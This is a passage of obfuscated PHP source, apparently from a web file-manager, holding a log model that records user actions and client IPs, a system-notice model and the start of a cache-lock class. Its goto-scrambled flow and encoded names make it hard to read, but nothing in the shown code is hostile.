$Aõ©Ø“‘À¡[2403] => LNG($Aõ©Ø“‘À¡[2404]), $Aõ©Ø“‘À¡[2405] => LNG($Aõ©Ø“‘À¡[2406]), $Aõ©Ø“‘À¡[2407] => LNG($Aõ©Ø“‘À¡[2408]), $Aõ©Ø“‘À¡[2409] => LNG($Aõ©Ø“‘À¡[2410]), $Aõ©Ø“‘À¡[2411] => LNG($Aõ©Ø“‘À¡[2412]), $Aõ©Ø“‘À¡[2413] => LNG($Aõ©Ø“‘À¡[2414])); } private function typeFile() { $Aà²‹Ü–Ş =& $_SERVER[Ìó]; $a¾Œ¢ßŒ„¿ = array($Aà²‹Ü–Ş[2047] => array($Aà²‹Ü–Ş[2048]), $Aà²‹Ü–Ş[2359] => array($Aà²‹Ü–Ş[2415]), $Aà²‹Ü–Ş[2361] => array($Aà²‹Ü–Ş[2416]), $Aà²‹Ü–Ş[2041] => array($Aà²‹Ü–Ş[2042]), $Aà²‹Ü–Ş[2367] => array(), $Aà²‹Ü–Ş[2369] => array(), $Aà²‹Ü–Ş[2371] => array(), $Aà²‹Ü–Ş[2050] => array($Aà²‹Ü–Ş[2052]), $Aà²‹Ü–Ş[2051] => array($Aà²‹Ü–Ş[2052]), $Aà²‹Ü–Ş[2375] => array($Aà²‹Ü–Ş[2417]), $Aà²‹Ü–Ş[2377] => array($Aà²‹Ü–Ş[2417]), $Aà²‹Ü–Ş[2379] => array($Aà²‹Ü–Ş[2418]), $Aà²‹Ü–Ş[2365] => array($Aà²‹Ü–Ş[2419]), $Aà²‹Ü–Ş[2381] => array($Aà²‹Ü–Ş[2420]), $Aà²‹Ü–Ş[2383] => array($Aà²‹Ü–Ş[2421]), $Aà²‹Ü–Ş[2045] => array($Aà²‹Ü–Ş[2046])); return $a¾Œ¢ßŒ„¿; } private function typeAll() { goto bƒ†»œ œ”; e¹½•ÌÍ›ô: foreach ($c©ÖÔƒî‚ø as $b«„‹Í™è‚ => $cÂ¢„Ğ«œÁ) { $BÃŠŒ™ˆŸ[$cÂ¢„Ğ«œÁ[0]] = $BÃŠŒ™ˆŸ[$b«„‹Í™è‚]; } $BÃŠŒ™ˆŸ[$BÙÀ…¤™”¾[2052]] = LNG($BÙÀ…¤™”¾[2422]); $BÃŠŒ™ˆŸ[$BÙÀ…¤™”¾[2417]] = LNG($BÙÀ…¤™”¾[2423]); goto a’ö•¬ÊÑ…; bƒ†»œ œ”: $BÙÀ…¤™”¾ =& $_SERVER[Ìó]; $BÃŠŒ™ˆŸ = $this->typeList; $c©ÖÔƒî‚ø = array_filter($this->typeFile()); goto e¹½•ÌÍ›ô; a’ö•¬ÊÑ…: return $BÃŠŒ™ˆŸ; goto b œêÇ­½ª; b œêÇ­½ª: } public function addLog($CÖöÌ‰©¤, $D˜¶âæÔòõ = array()) { goto d™ƒŸî¾ÚÄ; Aİˆ•›†¢¶: parent::add($D˜¶âæÔòõ); goto c²Çõ”’§; B›øİá®ô‘: $e«•íí·Á = get_client_ip(); if (!$D˜¶âæÔòõ || strlen(json_encode($D˜¶âæÔòõ)) >= 1024) { $D˜¶âæÔòõ = array($F¥§Ç¬öƒä[2424] => $e«•íí·Á); } else { if (is_array($D˜¶âæÔòõ)) { $D˜¶âæÔòõ[$F¥§Ç¬öƒä[2424]] = $e«•íí·Á; } else { $D˜¶âæÔòõ = array($F¥§Ç¬öƒä[1030] => $D˜¶âæÔòõ, $F¥§Ç¬öƒä[2424] => $e«•íí·Á); } } $D˜¶âæÔòõ = array($F¥§Ç¬öƒä[1399] => Session::sign(), $F¥§Ç¬öƒä[1400] => $f§Úïù’İ, $F¥§Ç¬öƒä[29] => $CÖöÌ‰©¤, $F¥§Ç¬öƒä[1402] => json_encode($D˜¶âæÔòõ)); goto Aİˆ•›†¢¶; d™ƒŸî¾ÚÄ: $F¥§Ç¬öƒä =& $_SERVER[Ìó]; if (!isset($this->typeList[$CÖöÌ‰©¤])) { return; } $f§Úïù’İ = USER_ID ? USER_ID : (isset($D˜¶âæÔòõ[$F¥§Ç¬öƒä[1409]]) ? $D˜¶âæÔòõ[$F¥§Ç¬öƒä[1409]] : 0); goto B›øİá®ô‘; c²Çõ”’§: } public function remove($DĞ¹Œ¤Äâ) { $this->where(array($_SERVER[Ìó][381] => $DĞ¹Œ¤Äâ))->delete(); } private function _makeOrder($C¬Á„ÙÈ¿ = '') { goto cØ¤„†¯ƒ¦; E¥ÑÛì¬·: $cŸßÊÈ‰«Ë = Input::get($DµåóĞ­‹Á[403], $DµåóĞ­‹Á[7], $DµåóĞ­‹Á[2210], array($DµåóĞ­‹Á[2147], $DµåóĞ­‹Á[399])); $cŸßÊÈ‰«Ë = $AÈî‰–‰§[$cŸßÊÈ‰«Ë]; $C¬Á„ÙÈ¿ = $C¬Á„ÙÈ¿ . "{$BŠèô«¸ê¸}\40{$cŸßÊÈ‰«Ë}"; goto FÖøÖ£—¸˜; FÖøÖ£—¸˜: return $this->order($C¬Á„ÙÈ¿); goto B‹ÑÉÌøŸÁ; cØ¤„†¯ƒ¦: $DµåóĞ­‹Á =& $_SERVER[Ìó]; $BŠèô«¸ê¸ = $DµåóĞ­‹Á[183]; $AÈî‰–‰§ = array($DµåóĞ­‹Á[397] => $DµåóĞ­‹Á[398], $DµåóĞ­‹Á[399] => $DµåóĞ­‹Á[400]); goto E¥ÑÛì¬·; B‹ÑÉÌøŸÁ: } public function get($dó¡ÀÄ­Ü… = '') { goto d¤Ş›†œÓ; C´ÑÇÇßÑî: $aˆÙ‹â”[$f¹ùøÂ·—Ø[350]] = $this->logList($aˆÙ‹â”[$f¹ùøÂ·—Ø[350]]); return $aˆÙ‹â”; goto CĞ¬ùœí›Ë; AšÁ„äİ’â: if (!empty($dó¡ÀÄ­Ü…[$f¹ùøÂ·—Ø[2424]])) { $F´‡ºçÅ£[$f¹ùøÂ·—Ø[400]] = array($f¹ùøÂ·—Ø[747], "\x25{$dó¡ÀÄ­Ü…[$f¹ùøÂ·—Ø[2424]]}\x25"); } $aˆÙ‹â” = $this->_makeOrder()->where($F´‡ºçÅ£)->selectPage(); if (empty($aˆÙ‹â”[$f¹ùøÂ·—Ø[350]])) { show_json(array(), !0, $aˆÙ‹â”[$f¹ùøÂ·—Ø[347]]); } goto C´ÑÇÇßÑî; d¤Ş›†œÓ: $f¹ùøÂ·—Ø =& $_SERVER[Ìó]; if (!$dó¡ÀÄ­Ü…) { show_json(array()); } $F´‡ºçÅ£ = array(); goto CÁğÈë«ƒ; CÁğÈë«ƒ: if ($dó¡ÀÄ­Ü…[$f¹ùøÂ·—Ø[1409]]) { $F´‡ºçÅ£[$f¹ùøÂ·—Ø[1409]] = $dó¡ÀÄ­Ü…[$f¹ùøÂ·—Ø[1409]]; } if (isset($dó¡ÀÄ­Ü…[$f¹ùøÂ·—Ø[698]])) { $f–ë¿·ÀìÔ = $dó¡ÀÄ­Ü…[$f¹ùøÂ·—Ø[698]]; $cÃ‹ïÎ»Æá = isset($dó¡ÀÄ­Ü…[$f¹ùøÂ·—Ø[699]]) ? $dó¡ÀÄ­Ü…[$f¹ùøÂ·—Ø[699]] : time(); $F´‡ºçÅ£[$f¹ùøÂ·—Ø[183]] = array($f¹ùøÂ·—Ø[317], array($f–ë¿·ÀìÔ, $cÃ‹ïÎ»Æá)); } if ($dó¡ÀÄ­Ü…[$f¹ùøÂ·—Ø[29]]) { $FÕ ¨¹‡´ = explode($f¹ùøÂ·—Ø[47], $dó¡ÀÄ­Ü…[$f¹ùøÂ·—Ø[29]]); $BĞ´šÚ¶Ø‹ = $this->typeFile(); $FÄÊß»«íƒ = array(); foreach ($FÕ ¨¹‡´ as $D¬éÉÄŞœà) { $FÄÊß»«íƒ[] = $D¬éÉÄŞœà; if (isset($BĞ´šÚ¶Ø‹[$D¬éÉÄŞœà])) { $FÄÊß»«íƒ = array_merge($FÄÊß»«íƒ, $BĞ´šÚ¶Ø‹[$D¬éÉÄŞœà]); } } $FÄÊß»«íƒ = array_unique($FÄÊß»«íƒ); if ($FÄÊß»«íƒ) { $F´‡ºçÅ£[$f¹ùøÂ·—Ø[29]] = array($f¹ùøÂ·—Ø[7], $FÄÊß»«íƒ); } } goto AšÁ„äİ’â; CĞ¬ùœí›Ë: } private function ipAddress(&$a„ÜÖ• ÁĞ) { $F×Ã”ğª¿î =& $_SERVER[Ìó]; if (!empty($a„ÜÖ• ÁĞ[$F×Ã”ğª¿î[2424]])) { $fÈ‘Ø–²Ùø = IpLocation::get($a„ÜÖ• ÁĞ[$F×Ã”ğª¿î[2424]]); if ($fÈ‘Ø–²Ùø == $F×Ã”ğª¿î[2425]) { $fÈ‘Ø–²Ùø = $F×Ã”ğª¿î[2426]; } } else { $fÈ‘Ø–²Ùø = LNG($F×Ã”ğª¿î[2427]); } $a„ÜÖ• ÁĞ[$F×Ã”ğª¿î[2428]] = $fÈ‘Ø–²Ùø; } private function descZipDownload($cƒ’È“ª¥Ù, &$FËÈœ°¾À) { $bƒ ¹âåÊº =& $_SERVER[Ìó]; if (!isset($cƒ’È“ª¥Ù[$bƒ ¹âåÊº[2429]])) { return; } $FÉ©Ğ°’Î¼ = json_decode($cƒ’È“ª¥Ù[$bƒ ¹âåÊº[2429]], !0); foreach ($FÉ©Ğ°’Î¼ as $e«ä¸‘¾àŸ) { if (!IO::init($e«ä¸‘¾àŸ[$bƒ ¹âåÊº[75]])) { continue; } if (!($CŠÓÙÖ†¾ = IO::infoFull($e«ä¸‘¾àŸ[$bƒ ¹âåÊº[75]]))) { continue; } $cƒ’È“ª¥Ù[$bƒ ¹âåÊº[75]] = $e«ä¸‘¾àŸ[$bƒ ¹âåÊº[75]]; $FËÈœ°¾À[] = $cƒ’È“ª¥Ù[$bƒ ¹âåÊº[365]] = $CŠÓÙÖ†¾[$bƒ ¹âåÊº[365]]; $FËÈœ°¾À[] = $cƒ’È“ª¥Ù[$bƒ ¹âåÊº[2243]] = $CŠÓÙÖ†¾[$bƒ ¹âåÊº[456]]; break; } return $cƒ’È“ª¥Ù; } private function getSourceList(&$c¦ô…Õ‡±Æ) { $déÕ«ß…Á =& $_SERVER[Ìó]; $f„Ğ¸—ùä = array(); foreach ($c¦ô…Õ‡±Æ as $eŞ½„“œÂ÷ => $FÜÔ…¯Û‹‚) { goto cÔ¿‰â¼ãÅ; CÈÖ¾×˜…: $f„Ğ¸—ùä[] = $EÒù»†ë[$déÕ«ß…Á[365]]; $f„Ğ¸—ùä[] = $EÒù»†ë[$déÕ«ß…Á[2243]]; if ($EÒù»†ë[$déÕ«ß…Á[29]] == $déÕ«ß…Á[487]) { $f„Ğ¸—ùä[] = $EÒù»†ë[$déÕ«ß…Á[400]][$déÕ«ß…Á[1002]]; $f„Ğ¸—ùä[] = $EÒù»†ë[$déÕ«ß…Á[400]][$déÕ«ß…Á[1003]]; } goto D¢öêÈ’­; cÔ¿‰â¼ãÅ: $EÒù»†ë = json_decode($FÜÔ…¯Û‹‚[$déÕ«ß…Á[400]], !0); if ($FÜÔ…¯Û‹‚[$déÕ«ß…Á[29]] == $déÕ«ß…Á[2044]) { $EÒù»†ë = $this->descZipDownload($EÒù»†ë, $f„Ğ¸—ùä); $c¦ô…Õ‡±Æ[$eŞ½„“œÂ÷][$déÕ«ß…Á[400]] = json_encode($EÒù»†ë); continue; } if (strpos($FÜÔ…¯Û‹‚[$déÕ«ß…Á[29]], $déÕ«ß…Á[2244]) !== 0) { goto BÀŸ¶ŞÔ°; Aáä¯”„½ø: $f„Ğ¸—ùä[] = $EÒù»†ë[$déÕ«ß…Á[365]] = $e‚é¦×íóĞ[$déÕ«ß…Á[365]]; $f„Ğ¸—ùä[] = $EÒù»†ë[$déÕ«ß…Á[2243]] = $e‚é¦×íóĞ[$déÕ«ß…Á[456]]; $c¦ô…Õ‡±Æ[$eŞ½„“œÂ÷][$déÕ«ß…Á[400]] = json_encode($EÒù»†ë); goto BùµÓˆ‘»İ; BùµÓˆ‘»İ: continue; goto DøâÇ‰‚ñ; BÀŸ¶ŞÔ°: if (!isset($EÒù»†ë[$déÕ«ß…Á[75]]) || strpos($FÜÔ…¯Û‹‚[$déÕ«ß…Á[29]], $déÕ«ß…Á[2430]) !== 0) { continue; } if (!IO::init($EÒù»†ë[$déÕ«ß…Á[75]])) { continue; } if (!($e‚é¦×íóĞ = IO::infoFull($EÒù»†ë[$déÕ«ß…Á[75]]))) { continue; } goto Aáä¯”„½ø; DøâÇ‰‚ñ: } goto CÈÖ¾×˜…; D¢öêÈ’­: if ($EÒù»†ë[$déÕ«ß…Á[29]] == $déÕ«ß…Á[2251]) { $f„Ğ¸—ùä[] = $EÒù»†ë[$déÕ«ß…Á[400]][$déÕ«ß…Á[365]]; } goto c‰¾ñè´éˆ; c‰¾ñè´éˆ: } if (!$f„Ğ¸—ùä) { return array(); } return Model($déÕ«ß…Á[748])->sourceListInfo($f„Ğ¸—ùä, !0); } private function logList($CšŞÊ¿ƒ±Ÿ) { goto e”…ÚÜˆŠ; F‹ÁÍâ™ñ”: $f›‘ÛæôŒ‘ = array(); foreach ($CšŞÊ¿ƒ±Ÿ as $fÁ‰‚æñ” => $Eô“¨ë©¾å) { goto C·Õ–šËã¾; B¿‡²¹’Ã: unset($Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[2433]]); $f–Ò‚œ£¹Ê[] = $Eô“¨ë©¾å; goto Eœ†Ñ ½™¸; C·Õ–šËã¾: $D…‡–Ëœ¢Ñ = $Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[29]]; $aÛ·ˆ·ÈÖ = isset($B¶¯Ñš¯ç‚[$Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[1409]]]) ? $B¶¯Ñš¯ç‚[$Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[1409]]] : !1; $DÙ¤…á‹ˆ² = strpos($D…‡–Ëœ¢Ñ, $A‚ÇğÈ£Ê¿[2431]) === 0 ? LNG($A‚ÇğÈ£Ê¿[2432]) : LNG($A‚ÇğÈ£Ê¿[2427]); goto a°‹ÁŞÔ—ï; Dª‹Ì«‹ç: $this->ipAddress($Eô“¨ë©¾å); if (strpos($D…‡–Ëœ¢Ñ, $A‚ÇğÈ£Ê¿[2244]) === 0 || isset($bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[2243]])) { goto Cè–Á³ëíÂ; Cè–Á³ëíÂ: $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[387]] = $cÓ·İµ‰§[$bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[365]]]; $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[2256]] = $cÓ·İµ‰§[$bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[2243]]]; if ($bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[29]] == $A‚ÇğÈ£Ê¿[487]) { $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[400]][$A‚ÇğÈ£Ê¿[1002]] = $cÓ·İµ‰§[$bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[400]][$A‚ÇğÈ£Ê¿[1002]]]; $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[400]][$A‚ÇğÈ£Ê¿[1003]] = $cÓ·İµ‰§[$bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[400]][$A‚ÇğÈ£Ê¿[1003]]]; } goto b½“†¨‰×Ã; CƒË¹‚Äê: if ($bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[2256]] && $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[2256]][$A‚ÇğÈ£Ê¿[367]] == $A‚ÇğÈ£Ê¿[1076]) { $f›‘ÛæôŒ‘[] = $Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[363]]; unset($CšŞÊ¿ƒ±Ÿ[$fÁ‰‚æñ”]); continue; } goto d¬®Ô§ƒ…; b½“†¨‰×Ã: if ($bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[29]] == $A‚ÇğÈ£Ê¿[2251]) { $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[400]][$A‚ÇğÈ£Ê¿[365]] = $cÓ·İµ‰§[$bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[400]][$A‚ÇğÈ£Ê¿[365]]]; } if ($bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[29]] == $A‚ÇğÈ£Ê¿[2039]) { $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[2256]] = $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[387]]; $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[2243]] = $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[2256]][$A‚ÇğÈ£Ê¿[365]]; $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[387]] = !1; $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[365]] = $A‚ÇğÈ£Ê¿[33]; } if ($bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[387]] && $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[387]][$A‚ÇğÈ£Ê¿[367]] == $A‚ÇğÈ£Ê¿[1076]) { $f›‘ÛæôŒ‘[] = $Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[363]]; unset($CšŞÊ¿ƒ±Ÿ[$fÁ‰‚æñ”]); continue; } goto CƒË¹‚Äê; d¬®Ô§ƒ…: } $Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[400]] = $bŒÇ»İï÷å; goto B¿‡²¹’Ã; a°‹ÁŞÔ—ï: $Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[28]] = isset($aÛ·ˆ·ÈÖ[$A‚ÇğÈ£Ê¿[28]]) ? $aÛ·ˆ·ÈÖ[$A‚ÇğÈ£Ê¿[28]] : LNG($A‚ÇğÈ£Ê¿[2427]); $Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[2292]] = isset($aÛ·ˆ·ÈÖ[$A‚ÇğÈ£Ê¿[2292]]) ? $aÛ·ˆ·ÈÖ[$A‚ÇğÈ£Ê¿[2292]] : $A‚ÇğÈ£Ê¿[33]; $Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[1317]] = isset($Cšƒ‹ªšóË[$D…‡–Ëœ¢Ñ]) ? $Cšƒ‹ªšóË[$D…‡–Ëœ¢Ñ] : $DÙ¤…á‹ˆ²; goto eùÒÕ¥†§á; eùÒÕ¥†§á: $Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[2209]] = $aÛ·ˆ·ÈÖ; $bŒÇ»İï÷å = json_decode($Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[400]], !0); $Eô“¨ë©¾å[$A‚ÇğÈ£Ê¿[2424]] = isset($bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[2424]]) ? $bŒÇ»İï÷å[$A‚ÇğÈ£Ê¿[2424]] : $A‚ÇğÈ£Ê¿[33]; goto Dª‹Ì«‹ç; Eœ†Ñ ½™¸: } $this->clearSystemPathLog($f›‘ÛæôŒ‘); goto Bó°¬¨º‘Ê; Bó°¬¨º‘Ê: return $f–Ò‚œ£¹Ê; goto eñ¶ŠßÊƒÇ; e”…ÚÜˆŠ: $A‚ÇğÈ£Ê¿ =& $_SERVER[Ìó]; $aÛÚÈÁàÁä = array_to_keyvalue($CšŞÊ¿ƒ±Ÿ, $A‚ÇğÈ£Ê¿[33], $A‚ÇğÈ£Ê¿[1409]); $B¶¯Ñš¯ç‚ = Model($A‚ÇğÈ£Ê¿[472])->userListInfo(array_unique($aÛÚÈÁàÁä)); goto DŒµ‘ÃÙò; DŒµ‘ÃÙò: $cÓ·İµ‰§ = $this->getSourceList($CšŞÊ¿ƒ±Ÿ); $Cšƒ‹ªšóË = $this->typeAll(); $f–Ò‚œ£¹Ê = array(); goto F‹ÁÍâ™ñ”; eñ¶ŠßÊƒÇ: } private function clearSystemPathLog($fê˜Öó©Ğ“) { $c¹Ÿ’¦ÔÌÓ =& $_SERVER[Ìó]; if (count($fê˜Öó©Ğ“) == 0) { return; } $Fì‡ŠÕ¤Ì¸ = array($c¹Ÿ’¦ÔÌÓ[363] => array($c¹Ÿ’¦ÔÌÓ[7], array_unique($fê˜Öó©Ğ“))); $this->where($Fì‡ŠÕ¤Ì¸)->delete(); } public function deviceList($C”œİ«ˆ, $a—°ÁìãÓ‰ = 0) { $dÂë–³»… =& $_SERVER[Ìó]; $cÊõè¶… Õ = array($dÂë–³»…[1409] => $C”œİ«ˆ, $dÂë–³»…[183] => array($dÂë–³»…[926], $a—°ÁìãÓ‰), $dÂë–³»…[29] => $dÂë–³»…[2012]); $D©õ¤„¬ŠÃ = array(); $FÂÒßé“Ñô = $this->field($dÂë–³»…[2434])->where($cÊõè¶… Õ)->order($dÂë–³»…[2254])->limit(50)->select(); foreach ($FÂÒßé“Ñô as $Bè®÷ìÔÄ† => $cĞ…¯±¼öÀ) { goto AÀÄ¶ÊÛ; f¦„îƒåâ: $this->ipAddress($cĞ…¯±¼öÀ); $cĞ…¯±¼öÀ[$dÂë–³»…[400]] = $BŠÁÅÀÜŒ–; $D©õ¤„¬ŠÃ[$a×µóİõã] = $cĞ…¯±¼öÀ; goto AÔ‚²¶À¹‰; AÀÄ¶ÊÛ: if ($Bè®÷ìÔÄ† > 0 && abs($cĞ…¯±¼öÀ[$dÂë–³»…[183]] - $FÂÒßé“Ñô[$Bè®÷ìÔÄ† - 1][$dÂë–³»…[183]]) < 5) { continue; } $BŠÁÅÀÜŒ– = json_decode($cĞ…¯±¼öÀ[$dÂë–³»…[400]], !0); $cĞ…¯±¼öÀ[$dÂë–³»…[2424]] = isset($BŠÁÅÀÜŒ–[$dÂë–³»…[2424]]) ? $BŠÁÅÀÜŒ–[$dÂë–³»…[2424]] : $dÂë–³»…[33]; goto D”Ø„•Ÿî×; D”Ø„•Ÿî×: unset($BŠÁÅÀÜŒ–[$dÂë–³»…[2424]]); $a×µóİõã = $this->deviceType($BŠÁÅÀÜŒ–[$dÂë–³»…[2245]]); if (isset($D©õ¤„¬ŠÃ[$a×µóİõã])) { continue; } goto f¦„îƒåâ; AÔ‚²¶À¹‰: } return array_values($D©õ¤„¬ŠÃ); } public function deviceType($e¤¦¤–éØ¬) { return $e¤¦¤–éØ¬; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\x6e\x6f\x74\151\143\145\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x63\157\x6e\x74\145\156\x74", "\x61\165\164\x68", "\x6d\x6f\x64\x65", "\x74\x69\x6d\145", "\x74\171\x70\x65", "\x6c\145\166\x65\x6c", "\x65\156\141\x62\x6c\145", "\163\157\162\164"); public function listData($c½¥éÊçÏ« = false, $Fˆ¢×ĞÂ = "\x73\157\162\164", $A®ô¡¿ãĞ = false) { return parent::listData($c½¥éÊçÏ«, $Fˆ¢×ĞÂ, $A®ô¡¿ãĞ); } public function add($B¼ÉˆŒğÎÀ) { goto C¶ïøˆçÓ•; AõÏÖ³ê¶²: return parent::insert($B¼ÉˆŒğÎÀ); goto Dƒ“¢ÌĞè; B“§êŒÑçÍ: $e½°ñ¦É´„ = time(); if ($B¼ÉˆŒğÎÀ[$aåÉ“áöÇ‡[12]] == $aåÉ“áöÇ‡[2435]) { $e½°ñ¦É´„ = strtotime($B¼ÉˆŒğÎÀ[$aåÉ“áöÇ‡[186]]); } $B¼ÉˆŒğÎÀ[$aåÉ“áöÇ‡[186]] = $e½°ñ¦É´„; goto AõÏÖ³ê¶²; C¶ïøˆçÓ•: $aåÉ“áöÇ‡ =& $_SERVER[Ìó]; $e„´ƒß‡†¯ = $this->findByName($B¼ÉˆŒğÎÀ[$aåÉ“áöÇ‡[28]]); if ($e„´ƒß‡†¯) { return !1; } goto B“§êŒÑçÍ; Dƒ“¢ÌĞè: } public function update($aŸ†åŞ’İ, $E™ùİœ’®) { goto bÄà»½«ö; E¡Í‰ç‚: if (!$e¯°à‰ˆ || $aùè¡¬…©‚ && $aùè¡¬…©‚[$AÓºî²¨„»[363]] != $e¯°à‰ˆ[$AÓºî²¨„»[363]]) { return !1; } $bê·ÙåÎ² = time(); if ($E™ùİœ’®[$AÓºî²¨„»[12]] == $AÓºî²¨„»[2435]) { $bê·ÙåÎ² = strtotime($E™ùİœ’®[$AÓºî²¨„»[186]]); } goto FÉËƒ¤±ŸĞ; FÉËƒ¤±ŸĞ: $E™ùİœ’®[$AÓºî²¨„»[186]] = $bê·ÙåÎ²; return parent::update($aŸ†åŞ’İ, $E™ùİœ’®); goto Bê—–ëİ²®; bÄà»½«ö: $AÓºî²¨„» =& $_SERVER[Ìó]; $e¯°à‰ˆ = $this->listData($aŸ†åŞ’İ); $aùè¡¬…©‚ = $this->findByName($E™ùİœ’®[$AÓºî²¨„»[28]]); goto E¡Í‰ç‚; Bê—–ëİ²®: } public function remove($b­å…›’‚÷) { $C®¹°â¶¬ = $this->listData($b­å…›’‚÷); if (!$C®¹°â¶¬ || $C®¹°â¶¬[$_SERVER[Ìó][1076]]) { return !1; } return parent::remove($b­å…›’‚÷); } public function sort($D¬œÔë®, $DØÓƒé‡ğö) { return parent::update($D¬œÔë®, $DØÓƒé‡ğö); } public function enable($DåŠ¢óÕ”ù, $eò»İ¬±”Ñ) { return parent::update($DåŠ¢óÕ”ù, array($_SERVER[Ìó][2436] => $eò»İ¬±”Ñ)); } private function initUserOption() { $d¡ ‚¥ù™ˆ =& $_SERVER[Ìó]; $this->optionType = $d¡ ‚¥ù™ˆ[2437]; $this->modelType = $d¡ ‚¥ù™ˆ[2438]; $this->field = array($d¡ ‚¥ù™ˆ[2439], $d¡ ‚¥ù™ˆ[28], $d¡ ‚¥ù™ˆ[186], $d¡ ‚¥ù™ˆ[29], $d¡ ‚¥ù™ˆ[2440], $d¡ ‚¥ù™ˆ[685], $d¡ ‚¥ù™ˆ[179]); } public function userNoticeGet($eŸ´•áŒÌÚ = false) { $this->initUserOption(); return parent::listData($eŸ´•áŒÌÚ, $_SERVER[Ìó][363], !0); } public function userNoticeAdd($b•Õ„É„À) { $C©—ä›¤à =& $_SERVER[Ìó]; $this->initUserOption(); $bÃ†Á¢²ˆ = $this->findByKey($C©—ä›¤à[2439], $b•Õ„É„À[$C©—ä›¤à[363]]); if ($bÃ†Á¢²ˆ) { return !0; } $CÖ¨”¾‡Ê = array($C©—ä›¤à[2439] => $b•Õ„É„À[$C©—ä›¤à[363]], $C©—ä›¤à[28] => $b•Õ„É„À[$C©—ä›¤à[28]], $C©—ä›¤à[186] => $b•Õ„É„À[$C©—ä›¤à[186]], $C©—ä›¤à[29] => isset($b•Õ„É„À[$C©—ä›¤à[29]]) ? $b•Õ„É„À[$C©—ä›¤à[29]] : 1, $C©—ä›¤à[2440] => isset($b•Õ„É„À[$C©—ä›¤à[2440]]) ? $b•Õ„É„À[$C©—ä›¤à[2440]] : 0, $C©—ä›¤à[685] => 0, $C©—ä›¤à[179] => 0); return parent::insert($CÖ¨”¾‡Ê); } public function userNoticeEdit($aˆ±ŸºøŒå, $d³‘½¹ÅÒ) { $this->initUserOption(); return parent::update($aˆ±ŸºøŒå, $d³‘½¹ÅÒ); } } goto CŠßØ““™Š; Cƒ…ÅÂ÷Õ»: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c­©×Û¤ˆ; E®ôĞßè: if ($BˆØ¡Ã½ª == $F¥Û£Àßõ[17] && $FÓù´ˆÄ‹ == $F¥Û£Àßõ[9]) { $BˆØ¡Ã½ª = $F¥Û£Àßõ[163]; } switch ($BˆØ¡Ã½ª) { case $F¥Û£Àßõ[752]: self::$handle = new CacheLockRedis(); break; case $F¥Û£Àßõ[753]: self::$handle = new CacheLockMemcached(); break; case $F¥Û£Àßõ[17]: self::$handle = new CacheLockDatabase(); break; case $F¥Û£Àßõ[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto aßÂ†‹õƒÈ; c­©×Û¤ˆ: $F¥Û£Àßõ =& $_SERVER[Ìó]; if (self::$handle) { return self::$handle; } $c÷©ƒ¼É™‡ = $GLOBALS[$F¥Û£Àßõ[6]][$F¥Û£Àßõ[333]]; goto BËö¥“¦Ëô; BËö¥“¦Ëô: self::$timeout = $c÷©ƒ¼É™‡[$F¥Û£Àßõ[762]] ? $c÷©ƒ¼É™‡[$F¥Û£Àßõ[762]] : 10; $FÓù´ˆÄ‹ = _get($GLOBALS[$F¥Û£Àßõ[6]], $F¥Û£Àßõ[763]); $BˆØ¡Ã½ª = $c÷©ƒ¼É™‡[$F¥Û£Àßõ[749]] ? $c÷©ƒ¼É™‡[$F¥Û£Àßõ[749]] : $F¥Û£Àßõ[163]; goto E®ôĞßè; aßÂ†‹õƒÈ: } private static function key($DÃŞºç³‡ƒ) { return $_SERVER[Ìó][764] . Cache::key($DÃŞºç³‡ƒ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($dáË‘ºĞ™ = '') { self::$errorMsg = $dáË‘ºĞ™; } public static function lockGlobal($dã«µÊéƒ, $E–Ç‘£Á÷§) { return self::lock($dã«µÊéƒ, $E–Ç‘£Á÷§, !0); } public static function lock($b²„ÜòÄÆ¢, $EØĞ¡ˆêĞò = false, $f’å×¤÷”Á = false) { goto eË°…¶‘Ÿ; e¬ƒÊÔÓ†: if (!$f’å×¤÷”Á) { self::$lockItem[$C‰Ö† •¯Û] = !0; } return $Bë”²ÏŞÓˆ; goto aœğÎƒº™”; Fµ»¬»™ê†: $EØĞ¡ˆêĞò = $EØĞ¡ˆêĞò ? $EØĞ¡ˆêĞò : self::$timeout; $Bë”²ÏŞÓˆ = $Fİ¡Ïñ–->lock($C‰Ö† •¯Û, $EØĞ¡ˆêĞò); if 